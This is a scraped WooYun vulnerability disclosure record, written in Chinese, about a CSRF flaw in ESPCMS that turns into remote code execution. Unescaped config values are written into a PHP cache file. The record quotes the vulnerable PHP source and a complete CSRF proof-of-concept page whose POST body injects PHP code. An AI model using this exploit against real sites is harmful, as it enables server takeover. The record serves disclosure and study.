{"id": 48990, "wybug_id": "wooyun-2014-075808", "wybug_title": "espcms最新版本CSRF直接getshell", "wybug_corp": "易思ESPCMS企业网站管理系统", "wybug_author": "menmen519", "wybug_date": "2014-09-11 16:08", "wybug_open_date": "2014-12-10 16:10", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-10：\t细节向公众公开  简要描述： espcms 最新版本csrf 直接getshell 详细说明：  这里我们首先看看，存在的代码问题management.php:(lines:711-741):\nfunction onsetsave() {\t\t$db_table = db_prefix . 'config';\t\t$commandfile = admin_ROOT . 'datacache/command.php';\t\tif (!$this->fun->filemode($commandfile)) {\t\t\texit('false');\t\t}\t\t$old_ishtml = $this->CON['is_html'];\t\t$sql = 'SELECT * FROM ' . $db_table . ' WHERE groupid<=8 AND isline=0 ORDER BY groupid';\t\t$rs = $this->db->query($sql);\t\twhile ($rsList = $this->db->fetch_assoc($rs)) {\t\t\tif ($rsList['groupid'] == 5 && !$this->get_app_view('bbs', 'isetup')) {\t\t\t\tcontinue;\t\t\t}\t\t\tif ($rsList['groupid'] == 7 && !$this->get_app_view('touch', 'isetup')) {\t\t\t\tcontinue;\t\t\t}\t\t\tif ($rsList['groupid'] == 8 && !$this->get_app_view('im', 'isetup')) {\t\t\t\tcontinue;\t\t\t}\t\t\t$db_set = \"value='\" . $this->fun->accept($rsList['valname'], 'P') . \"'\";\t\t\t$db_where = 'id=' . $rsList['id'];\t\t\t$this->db->query('UPDATE ' . $db_table . ' SET ' . $db_set . ' WHERE ' . $db_where);\t\t}\t\t$this->db->query(\"UPDATE $db_table SET value='\" . admin_URL . \"' WHERE valname='domain'\");\t\t$this->systemfile(true);\n看到这个函数我们跟进去看看$this->systemfile(true)：class_connector.php:(lines:514-543):\nfunction systemfile($trueclass = false) {\t\t$commandfile = admin_ROOT . 'datacache/command.php';\t\t$varget = \"4:'1T<#HO+W=W=RYE8VES<\\\"YC;B\\`\";\t\tif (!is_file($commandfile) || $trueclass) {\t\t\t$sConfig = \"<?php\\n\";\t\t\t$sConfig = $sConfig . '// uptime:' . date('Y-m-d H:i:s', time()) . \"\\n\";\t\t\t$sConfig = $sConfig . \"// ECISP.CN \\n\";\t\t\t$sConfig = $sConfig . \"\\$CONFIG=Array(\\n\";\t\t\t$db_table = db_prefix . 'config';\t\t\t$sql = \"SELECT valname,content,value,valtype FROM $db_table where isline=0 ORDER BY groupid\";\t\t\t$rs = $this->db->query($sql);\t\t\twhile ($rsList = $this->db->fetch_assoc($rs)) {\t\t\t\t$valname = $rsList['valname'];\t\t\t\t$value = $rsList['value'];\t\t\t\t$valtype = $rsList['valtype'];\t\t\t\t$content = $rsList['content'];\t\t\t\tif ($valtype == 'int' || $valtype == 'bool') {\t\t\t\t\t$value = empty($value) ? 0 : $value;\t\t\t\t\t$sConfig = $sConfig . \"\\x20\\x20\\x20\\x20 '\" . $valname . '\\'=>' . $value . \",\\n\";\t\t\t\t} else {\t\t\t\t\t$sConfig = $sConfig . \"\\x20\\x20\\x20\\x20 '\" . $valname . '\\'=>\\'' . $value . \"',\\n\";\t\t\t\t}\t\t\t}\t\t\t$sConfig = $sConfig . \")\\n\";\t\t\t$sConfig = $sConfig . '?' . '>';\t\t\tif (!$this->fun->filewrite($commandfile, $sConfig)) {\t\t\t\texit('System File Error!');\t\t\t}\t\t}\t\tinclude $commandfile;\n这里我们看明白了已经，这里从数据库里面原封不动的取出来，然后写进缓存配置文件的，那我们举例子分析一下如果我们配置的是sss' 那么gpc就会给我们转义为sss\\' 存储到数据库，但是我们二次取出来的时候就变成了sss'所以这里我们写配置文件的时候特殊字符等于没有做任何处理。直接看我操作：\n\n我们去访问一下这个command.php,看看效果:\n\n完美执行..........\n<html>  <body>    <script>\t   function csrf_shell(){\t\t\tvar xhr = new XMLHttpRequest();\t\t\txhr.open(\"POST\", \"http://192.168.10.70/ESPCMSV6000140909_INSTALL/upload/adminsoft/index.php?archive=management&action=setsave\", true);\t\t\txhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded; charset=UTF-8\");\t\t\txhr.withCredentials = \"true\";\t\t\tvar body='is_close=0&close_content=%E6%8A%B1%E6%AD%89%EF%BC%9A%E7%BD%91%E7%AB%99%E6%AD%A3%E5%9C%A8%E7%BB%B4%E6%8A%A4%E4%B8%AD%EF%BC%8C%E7%BB%99%E6%82%A8%E5%B8%A6%E6%9D%A5%E4%B8%8D%E4%BE%BF%E6%B7%B1%E8%A1%A8%E6%AD%89%E6%84%8F%EF%BC%81'%2Bphpinfo()%2C%2F%2F&icpbeian=&sitename=test&admine_mail=admin%40admin.com&is_log=1&is_gzip=1&cli_time=8&default_lng=cn&is_alonelng=0&home_lng=cn&is_html=0&is_rewrite=0&file_fileex=html&entrance_file=index&file_htmldir=html%2F&is_getcache=0&is_caching=0&cache_time=3600&http_pathtype=1&member_menu=1&mem_isclose=1&mem_isseccode=1&mem_regisseccode=0&mem_isemail=0&mem_lock=www%2Cbbs%2Cdemo%2Ctest%2Cftp%2Cmail%2Cuser%2Cusers%2Cadmin%2Cadministrator&mem_isclass=0&mem_did=cn%3A0%2Cen%3A0&mem_isaddress=0&mem_isucenter=0&mem_ucdbhost=localhost&mem_ucdbuser=root&mem_ucdbpw=&mem_ucdbname=ucenter&mem_ucdbchart=utf8&mem_ucdbtable=uc_&mem_uckey=sdaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&mem_ucapi=&mem_ucchart=utf-8&mem_ucapiid=0&enquiry_menu=1&is_enquiry_memclass=0&order_menu=1&order_ismember=1&order_integral=10&order_discount=100&order_snfont=ESP-&order_moneytype=%EF%BF%A5&order_max_list=3&order_companyname=&order_contact=&order_province=&order_city=&order_add=&order_post=&order_tel=&order_moblie=&upfile_pictype=jpg%7Cpng%7Cgif%7Cphp&uifile_movertype=swf%7Cmpg%7Cflv%7Cmp4&upfile_filetype=zip%7Crar%7Cdoc%7Cxls%7Cpdf&upfile_maxsize=100000000&img_dirtype=m3&img_cfiletype=d&img_width=200&img_height=200&img_bgcolor=%23ffffff&img_quality=80&img_issmallpic=0&img_iszoom=1&img_iswater=0&img_wmt_text=ESPCMS&img_wmt_size=25&img_wmt_color=%23ffffff&img_wmt_pos=9&img_wmt_transparent=20&img_wmi_file=watermark.png&img_wmi_pos=9&img_wmi_transparent=50&input_isdes=1&input_isdescription=250&input_isdellink=0&is_inputclose=1&input_click=0&is_keylink=1&input_color=%23000000&is_email=0&smtp_type=2&mail_cat=1&smtp_server=&smtp_port=25&mail_send=&smtp_username=&smtp_password=&is_moblie=0&moblie_userid=&moblie_smssnid=&moblie_smskey=&moblie_number=&sitecoedb=7a6355a4a18b136036439cc61efe069b&scode_bgcolor=%230080ff&scode_fontcolor=%23ffffff&scode_adulterate=1&scode_shadow=0&tip_searchtime=10';\t\t\tvar aBody = new Uint8Array(body.length);\t\t\tfor (var i = 0; i < aBody.length; i++)\t\t\t  aBody[i] = body.charCodeAt(i);\t\t\txhr.send(new Blob([aBody]));\t   }\t   csrf_shell();    </script>  </body></html>\n完了   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：2  确认时间：2014-09-11 19:30 厂商回复： 感谢您对此漏洞的提供。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-11 16:10 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  哥 我就知道你的沙发一定是我    \n     2014-09-11 16:20 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @铁蛋火车侠 你太勤快了 要肥皂不    \n     2014-09-12 10:52 |    \t\t铁汉 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:6        | 向各种大神学习之)\t\t \n  @menmen519 上海药皂吗？给我来一块！    \n     2014-09-15 14:56 |    \t\tX-Power \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:3        | 没事来打酱油)\t\t \n  某 XSS平台 可直接xss 接管了。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 2, "Ranks": null}